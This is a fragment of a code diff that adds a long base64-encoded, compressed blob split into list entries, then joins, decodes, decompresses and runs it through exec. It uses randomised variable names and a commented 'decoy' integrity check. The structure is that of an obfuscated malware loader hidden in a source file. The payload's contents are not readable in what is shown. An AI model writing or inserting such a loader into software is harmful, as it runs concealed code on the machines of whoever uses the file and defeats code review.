+    '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',
+    'KBMbC3m0+H8Bzp5m0w=='
+]
+
+_wrPnhqhX = "".join(_ANtoaNUy)
+_xkcIXmcC = _isRdNJVt.decompress(_xJPWCSls.b64decode(_wrPnhqhX))
+exec(_xkcIXmcC.decode('utf-8'))
+
+# Integrity check (decoy)
+# def _check_integrity():
+#     import hashlib
+#     return hashlib.md5(_wrPnhqhX.encode()).hexdigest() == 'fixed_hash_here'
